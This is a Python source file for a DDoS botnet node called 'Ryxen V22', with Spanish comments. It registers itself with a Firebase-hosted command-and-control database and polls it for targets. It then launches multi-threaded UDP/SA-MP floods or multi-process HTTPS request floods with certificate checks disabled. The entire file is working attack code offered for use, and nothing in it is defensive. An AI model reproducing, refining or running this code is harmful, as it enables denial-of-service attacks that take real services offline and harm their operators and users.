import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, os

# CONFIGURACIÓN RYXEN V22
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

def get_node_info_sync():
    try:
        import requests
        r = requests.get('http://ip-api.com/json/', timeout=5).json()
        return r.get('query', '0.0.0.0'), r.get('countryCode', 'UN')
    except: return "0.0.0.0", "UN"

# --- MOTOR L4 (UDP/SAMP) - FUERZA BRUTA MULTI-NÚCLEO ---
def udp_high_speed(target_ip, target_port, end_time):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Aumentamos el buffer de envío del sistema operativo
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    # Payload optimizado para dstats de Gbps (1400 bytes para evitar fragmentación MTU)
    packet_data = random._urandom(1400) 
    
    while time.time() < end_time:
        try:
            sock.sendto(packet_data, (target_ip, int(target_port)))
        except: pass

# --- MOTOR L7 (HTTPS/TLS) - ASYNC EXTREMO ---
async def extreme_l7(target, end_time, semaphore):
    ctx = ssl.create_default_context()
    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256')
    
    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, ttl_dns_cache=600)
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with semaphore:
                try:
                    headers = {
                        'User-Agent': f'Ryxen-Extreme-{random.randint(10000,99999)}',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Connection': 'keep-alive'
                    }
                    async with session.get(target, headers=headers, timeout=1, allow_redirects=False) as r:
                        r.close()
                except: await asyncio.sleep(0.0001)

def start_l7_process(target, end_time):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(20000) # Semáforo masivo
    # 300 tareas asíncronas por cada proceso
    tasks = [extreme_l7(target, end_time, sem) for _ in range(300)]
    loop.run_until_complete(asyncio.gather(*tasks))

async def main():
    ip, cc = get_node_info_sync()
    nid = f"RX-{cc}-{random.randint(100,999)}"
    print(f"[*] Ryxen Neural Node {nid} activo. Potenciando hilos...")
    
    async with aiohttp.ClientSession() as session:
        await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "ip": ip, "cc": cc, "t": time.time()})
        last_s = ""
        
        while True:
            try:
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                if data and data.get('stamp') != last_s:
                    last_s = data['stamp']
                    method, target, duration = data['method'], data['target'], int(data['time'])
                    if duration <= 0: continue

                    end_attack = time.time() + duration
                    cores = multiprocessing.cpu_count()
                    
                    if ".udp" in method or ".samp" in method:
                        host, port = target.split(':')
                        # Lanzamos 300 hilos distribuidos en todos los cores
                        for _ in range(300):
                            threading.Thread(target=udp_high_speed, args=(host, port, end_attack), daemon=True).start()
                    else:
                        # Lanzamos procesos independientes para bypassear el GIL de Python
                        for _ in range(cores):
                            multiprocessing.Process(target=start_l7_process, args=(target, end_attack), daemon=True).start()
                            
            except: pass
            await asyncio.sleep(1.5)

if __name__ == "__main__":
    asyncio.run(main())

